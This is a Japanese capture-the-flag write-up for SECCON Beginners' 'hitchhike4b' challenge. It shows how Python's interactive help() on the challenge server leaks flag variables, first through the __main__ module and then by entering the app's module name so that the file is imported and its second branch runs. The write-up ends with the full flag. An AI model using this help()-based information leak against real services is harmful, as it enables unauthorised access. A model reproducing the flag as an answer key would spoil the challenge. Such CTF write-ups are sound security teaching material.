# Writeup

`nc hitchhike4b.quals.beginners.seccon.jp 55433` を実行する。

```
$ nc hitchhike4b.quals.beginners.seccon.jp 55433
 _     _ _       _     _     _ _        _  _   _
| |__ (_) |_ ___| |__ | |__ (_) | _____| || | | |__
| '_ \| | __/ __| '_ \| '_ \| | |/ / _ \ || |_| '_ \
| | | | | || (__| | | | | | | |   <  __/__   _| |_) |
|_| |_|_|\__\___|_| |_|_| |_|_|_|\_\___|  |_| |_.__/

----------------------------------------------------------------------------------------------------    

# Source Code

import os
os.environ["PAGER"] = "cat" # No hitchhike(SECCON 2021)

if __name__ == "__main__":
    flag1 = "********************FLAG_PART_1********************"
    help() # I need somebody ...

if __name__ != "__main__":
    flag2 = "********************FLAG_PART_2********************"
    help() # Not just anybody ...

---------------------------------------------------------------------------------------------------- 
```

サーバー側にあるソースコードが表示されている。

Pythonの`help()`が実行されていて、いくつかコマンドが打てる。

`__name__`などの予約語をいくつか売ってみると、`__main__`と打った時に変数が表示され、フラグの前半部分が得られた。

```
help> __main__
Help on module __main__:

NAME
    __main__

DATA
    __annotations__ = {}
    flag1 = 'ctf4b{53cc0n_15_1n_m'

FILE
    /home/ctf/hitchhike4b/app_35f13ca33b0cc8c9e7d723b78627d39aceeac1fc.py
```

ソースコードを見ると、フラグの後半部分を表示するためには`__main__`でない方法で自身のコードを実行させれば良さそうなので、モジュールとして読み込む。

ファイル名が分かっているので、そのまま入力するとモジュールとして読み込むことができる。

```
help> app_35f13ca33b0cc8c9e7d723b78627d39aceeac1fc
----------------------------------------------------------------------------------------------------    

# Source Code

import os
os.environ["PAGER"] = "cat" # No hitchhike(SECCON 2021)

if __name__ == "__main__":
    flag1 = "********************FLAG_PART_1********************"
    help() # I need somebody ...

if __name__ != "__main__":
    flag2 = "********************FLAG_PART_2********************"
    help() # Not just anybody ...

---------------------------------------------------------------------------------------------------- 
```

```
help> app_35f13ca33b0cc8c9e7d723b78627d39aceeac1fc
Help on module app_35f13ca33b0cc8c9e7d723b78627d39aceeac1fc:

NAME
    app_35f13ca33b0cc8c9e7d723b78627d39aceeac1fc

DATA
    flag2 = 'y_34r5_4nd_1n_my_3y35}'

FILE
    /home/ctf/hitchhike4b/app_35f13ca33b0cc8c9e7d723b78627d39aceeac1fc.py
```

モジュールとして読み込んだので、`flag2`のほうが実行されて表示される。

<!-- ctf4b{53cc0n_15_1n_my_34r5_4nd_1n_my_3y35} -->
